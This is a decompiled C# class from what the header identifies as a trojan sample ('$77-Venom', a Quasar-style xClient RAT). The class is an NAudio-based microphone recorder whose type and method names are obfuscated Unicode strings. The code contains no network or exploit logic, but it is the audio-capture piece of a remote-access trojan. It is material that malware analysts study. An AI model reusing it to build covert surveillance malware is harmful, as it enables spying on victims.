// Decompiled with JetBrains decompiler
// Type: xClient.Core.NAudio.Wave.WaveInputs.WaveIn
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.NAudio.Wave.WaveStreams;

namespace xClient.Core.NAudio.Wave.WaveInputs
{
  public class WaveIn : IWaveIn, IDisposable
  {
    private IntPtr waveInHandle;
    private volatile bool recording;
    private WaveInBuffer[] buffers;
    private readonly 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\u19FAꋜ礂䡤\uF5D7匍뢢\uFFFD謱홶閩\u3227\u2F8F\uE237ͽ\u2006卼ᝑ殭\uF754 callback;
    private 䜣褁燜誁吺\u24AD틦\uFFFD恼貨虷გ赌ꥌ霟弾牲췶멃\u2AFA callbackInfo;
    private readonly SynchronizationContext syncContext;
    private int lastReturnedBufferIndex;

    public event EventHandler<뜟\u0BA1悉ᖃ邎펶㬌遊㗍덪쑾\uFFFD\u33F7薂\uEB2D๊\uABFC\uFFFD\uFFFD䛕> DataAvailable;

    public event EventHandler<瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛> RecordingStopped;

    public WaveIn()
      : this(䜣褁燜誁吺\u24AD틦\uFFFD恼貨虷გ赌ꥌ霟弾牲췶멃\u2AFA.渨ꨇ캸쉧\uF180왢\uEF6E菱ꚣ䆑Ḉꬸ鄞譗戬姵鋠窅㡞\u2B82())
    {
    }

    public WaveIn(IntPtr windowHandle)
      : this(䜣褁燜誁吺\u24AD틦\uFFFD恼貨虷გ赌ꥌ霟弾牲췶멃\u2AFA.㡏灪\uE4EDὭ㮉ග\uE445\u2FD9뇃ⅉԷ冽긧霍\uEB11ㆎ\uF0D9讞龬聆(windowHandle))
    {
    }

    public WaveIn(䜣褁燜誁吺\u24AD틦\uFFFD恼貨虷გ赌ꥌ霟弾牲췶멃\u2AFA callbackInfo)
    {
      this.syncContext = SynchronizationContext.Current;
      if ((callbackInfo.Strategy == 뺇嬠䋙㛌ﴑۺ\uFFFD㪩䀁\uFFFD䭀ｓ턴\uEBA6瑷ఞᅡ赔ᒖ\u2D75.㨬ㆭਨ갔㣒햶\uE366뙇偹\uFFFDᠠ롋様㢞鱲膧夶\u29F5럈ᔭ || callbackInfo.Strategy == 뺇嬠䋙㛌ﴑۺ\uFFFD㪩䀁\uFFFD䭀ｓ턴\uEBA6瑷ఞᅡ赔ᒖ\u2D75.쐑䳸墵媰ᠪＬ뮶\u28A2\u2A14\u332B巯\uF730䂿ٽ融샿\uEC6D\uEE78\uEB66\u2204) && this.syncContext == null)
        throw new InvalidOperationException("Use WaveInEvent to record on a background thread");
      this.DeviceNumber = 0;
      this.WaveFormat = new 蒹䔇ᚮ\uE740朁鸙宄䄨덈鸘㔌\uFFFDꀯ霤\uE673䞀\uF43A蠤计ሡ(8000, 16, 1);
      this.BufferMilliseconds = 100;
      this.NumberOfBuffers = 3;
      this.callback = new 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\u19FAꋜ礂䡤\uF5D7匍뢢\uFFFD謱홶閩\u3227\u2F8F\uE237ͽ\u2006卼ᝑ殭\uF754(this.Callback);
      this.callbackInfo = callbackInfo;
      callbackInfo.휽䌋ퟋ\u2A2B䎪ᛰ㲮\uFFFD뎭ꑢ믈䤗肉晅쾷㵠띶긩傾슜(this.callback);
    }

    public static int DeviceCount => 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\uE75A鼻풰썴\uF037䆲縛鐰仕밮팾ǅ矺杋잒㜗\uFFFD뷳嚙๋();

    public static 獇ᆉ\uFFFD䅹\uFFED鸹䦖ꣴ\u0FD2\u2E11轏薃嘮\uFFFD褾衾ᮔ䇾ؤ靅 GetCapabilities(
      int devNumber)
    {
      獇ᆉ\uFFFD䅹\uFFED鸹䦖ꣴ\u0FD2\u2E11轏薃嘮\uFFFD褾衾ᮔ䇾ؤ靅 waveInCaps = new 獇ᆉ\uFFFD䅹\uFFED鸹䦖ꣴ\u0FD2\u2E11轏薃嘮\uFFFD褾衾ᮔ䇾ؤ靅();
      int waveInCapsSize = Marshal.SizeOf((object) waveInCaps);
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\u1A9C寣\u0FEA踌\u187A殢褲\u2319佼ꉏ뼇\u23A3谵\u275A뾔\uAAD7\uFFFDㅡ府ბ((IntPtr) devNumber, out waveInCaps, waveInCapsSize), "waveInGetDevCaps");
      return waveInCaps;
    }

    public int BufferMilliseconds { get; set; }

    public int NumberOfBuffers { get; set; }

    public int DeviceNumber { get; set; }

    private void CreateBuffers()
    {
      int bufferSize = this.BufferMilliseconds * this.WaveFormat.AverageBytesPerSecond / 1000;
      if (bufferSize % this.WaveFormat.BlockAlign != 0)
        bufferSize -= bufferSize % this.WaveFormat.BlockAlign;
      this.buffers = new WaveInBuffer[this.NumberOfBuffers];
      for (int index = 0; index < this.buffers.Length; ++index)
        this.buffers[index] = new WaveInBuffer(this.waveInHandle, bufferSize);
    }

    private void Callback(
      IntPtr waveInHandle,
      巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.ꎈᵨ\u2AA1ꙕ\uEB94\uE450廻熜ண궺ᤕሲᔳ︅첁ᘉ\uA67EŔ\uED35腕 message,
      IntPtr userData,
      㛚殰Ὀ璟ᵟ뽏\uE205虡\uAAD7\u1B4F谰\uA62E\uF60Eㄻ\uF8D0䵬㯗뎁稍\u0087 waveHeader,
      IntPtr reserved)
    {
      if (message != 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.ꎈᵨ\u2AA1ꙕ\uEB94\uE450廻熜ண궺ᤕሲᔳ︅첁ᘉ\uA67EŔ\uED35腕.ᜭ뛎\u24AD㣭꾞ᤘ帆蠀\uEF39\u215E䥥켧헭\u282E\uEF0D싌\u26FE샑葬ꎦ || !this.recording)
        return;
      WaveInBuffer target = (WaveInBuffer) ((GCHandle) waveHeader.芪\u227D鳓ܡ虜\u0FDA\uE58Cꌛ\uE3CD\uFFFD\uE2EE妜疸\uF002ﰣ痝긑䅳鱾\u2E6C).Target;
      if (target == null)
        return;
      this.lastReturnedBufferIndex = Array.IndexOf<WaveInBuffer>(this.buffers, target);
      this.RaiseDataAvailable(target);
      try
      {
        target.Reuse();
      }
      catch (Exception ex)
      {
        this.recording = false;
        this.RaiseRecordingStopped(ex);
      }
    }

    private void RaiseDataAvailable(WaveInBuffer buffer)
    {
      EventHandler<뜟\u0BA1悉ᖃ邎펶㬌遊㗍덪쑾\uFFFD\u33F7薂\uEB2D๊\uABFC\uFFFD\uFFFD䛕> dataAvailable = this.DataAvailable;
      if (dataAvailable == null)
        return;
      dataAvailable((object) this, new 뜟\u0BA1悉ᖃ邎펶㬌遊㗍덪쑾\uFFFD\u33F7薂\uEB2D๊\uABFC\uFFFD\uFFFD䛕(buffer.Data, buffer.BytesRecorded));
    }

    private void RaiseRecordingStopped(Exception e)
    {
      EventHandler<瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛> handler = this.RecordingStopped;
      if (handler == null)
        return;
      if (this.syncContext == null)
        handler((object) this, new 瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛(e));
      else
        this.syncContext.Post((SendOrPostCallback) (state => handler((object) this, new 瞟諭屴\uFFFD햓囦\u32CA쑋\uF318뗌驵졛瓃놚ｏ\u1AF6줄\u1CC1ٿ뱛(e))), (object) null);
    }

    private void OpenWaveInDevice()
    {
      this.CloseWaveInDevice();
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(this.callbackInfo.Ьﶇ\uFFFD쳁\uFFFD닱똀ᒍㄪൢڢ\u3244\uE807ᎂ溊ې\uF4B8蒖딀更(out this.waveInHandle, this.DeviceNumber, this.WaveFormat, this.callback), "waveInOpen");
      this.CreateBuffers();
    }

    public void StartRecording()
    {
      if (this.recording)
        throw new InvalidOperationException("Already recording");
      this.OpenWaveInDevice();
      this.EnqueueBuffers();
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\u2AE7\uF859쐿\uE578偷翗ᓯ䖾\u285B퍢ᶬ\uED3D닗㜄太爞㮰\uF45F㑻\uFFFD(this.waveInHandle), "waveInStart");
      this.recording = true;
    }

    private void EnqueueBuffers()
    {
      foreach (WaveInBuffer buffer in this.buffers)
      {
        if (!buffer.InQueue)
          buffer.Reuse();
      }
    }

    public void StopRecording()
    {
      if (!this.recording)
        return;
      this.recording = false;
      ᔦ\uF14B̔촮\u2743븮浘蓧ꡆ烋枿䨿\u269E逇埓뼌붬额\uFFFD鬊.嘐颋뇶鯿쏃輊\uF479ذ\uE5DB媩\uE8D4\uFFFDጘ\u20A3냪䊏ᆶ\uF4DF\uF761\uF74B(巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.\uEE3A鋎鏥쒔찵蹉縄ᩓ岠菿\uFFFD粡ﮥ䏒苩짺缣汒辱껕(this.waveInHandle), "waveInStop");
      for (int index = 0; index < this.buffers.Length; ++index)
      {
        WaveInBuffer buffer = this.buffers[(index + this.lastReturnedBufferIndex + 1) % this.buffers.Length];
        if (buffer.Done)
          this.RaiseDataAvailable(buffer);
      }
      this.RaiseRecordingStopped((Exception) null);
    }

    public 蒹䔇ᚮ\uE740朁鸙宄䄨덈鸘㔌\uFFFDꀯ霤\uE673䞀\uF43A蠤计ሡ WaveFormat { get; set; }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      if (this.recording)
        this.StopRecording();
      this.CloseWaveInDevice();
      if (this.callbackInfo == null)
        return;
      this.callbackInfo.ꋃ銃잩ᓬゅⶫ曽ﺠ眄䟪ܤ삙\u1FED\uF0D0\uE4ED쇢祿甤蠒咻();
      this.callbackInfo = (䜣褁燜誁吺\u24AD틦\uFFFD恼貨虷გ赌ꥌ霟弾牲췶멃\u2AFA) null;
    }

    private void CloseWaveInDevice()
    {
      if (this.waveInHandle == IntPtr.Zero)
        return;
      int num1 = (int) 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.亂䤾쀁㷊줂쒲伀뫭樱탄㢴ᧅ붂筌偶\uFFFD꺲ᢜ\u2417ꐬ(this.waveInHandle);
      if (this.buffers != null)
      {
        for (int index = 0; index < this.buffers.Length; ++index)
          this.buffers[index].Dispose();
        this.buffers = (WaveInBuffer[]) null;
      }
      int num2 = (int) 巛퀝폳\uF0DE\uE025晱舘헸\u201D橑䭫ඏﭓ\u135C퉺㥵哸睎絳잧.募\uEB44\uE6F7晉\uF6C9ጋ幟\uE7AA䁾ᧄ䗽\uF61Eꯑ\uE453倿鄭ﲮ鐚渁ㄹ(this.waveInHandle);
      this.waveInHandle = IntPtr.Zero;
    }

    public \u3206ꉻ测ᦛ娸嶝赎\u2496㯌㳭ꯒ䢳쿔䦸砖ㆶ칁珵鎅磫 GetMixerLine() => !(this.waveInHandle != IntPtr.Zero) ? new \u3206ꉻ测ᦛ娸嶝赎\u2496㯌㳭ꯒ䢳쿔䦸砖ㆶ칁珵鎅磫((IntPtr) this.DeviceNumber, 0, 沏蹉㱤쳶兦ब烤湡\uFFFD䅆Ꮹࠄ栌\uECBE쬅\u2867ꠕ\u070D꤆մ.謜蚘켧饲펓㝓靄ඃ㚁\uE0B4涎킰룪渫\uEF05譩淴阶춘ᛦ) : new \u3206ꉻ测ᦛ娸嶝赎\u2496㯌㳭ꯒ䢳쿔䦸砖ㆶ칁珵鎅磫(this.waveInHandle, 0, 沏蹉㱤쳶兦ब烤湡\uFFFD䅆Ꮹࠄ栌\uECBE쬅\u2867ꠕ\u070D꤆մ.痖價쒝ۥ羛貦꽚碡Ẵ\uF30D\u0E80ኀ찠\u09F9骒떠\u2FC9逐奬Ὓ);

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }
  }
}
